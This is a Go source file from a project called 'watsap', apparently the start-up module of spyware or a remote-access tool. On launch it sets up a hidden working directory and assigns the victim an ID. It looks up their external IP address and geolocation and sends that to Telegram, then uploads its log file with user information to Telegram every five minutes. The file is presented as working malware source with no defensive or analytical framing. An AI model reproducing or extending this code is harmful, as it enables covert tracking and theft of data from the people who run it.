package wainit

import (
	"os"
	"time"
	"watsap/plugins/geoip"
	"watsap/utils/config"
	"watsap/utils/messages"
	"watsap/utils/telegram"
)

// workdir setup
func WorkDir() {
	if _, err := os.ReadDir(config.WaDir); err != nil {
		os.MkdirAll(config.WaDir, 0755)
	}
	// change working directory
	os.Chdir(config.WaDir)
}

func SendLogToTG() {
	// send log to telegram
	if config.DebugMode {
		if config.WaLogging {
			for {
				telegram.TgSendFile(config.LogFile, messages.GetUserInfoMsg())
				time.Sleep(5 * time.Minute)
			}
		}

	}
}

func InitWa() {
	WorkDir()           // set working directory
	config.SetupLog()   // setup logging
	InitUserID()        // assign user ID
	geoip.GetIP()       // get user external IP address and geo location
	geoip.SendGeoToTG() // send user geo location to telegram
	go SendLogToTG()    // send log to telegram
}
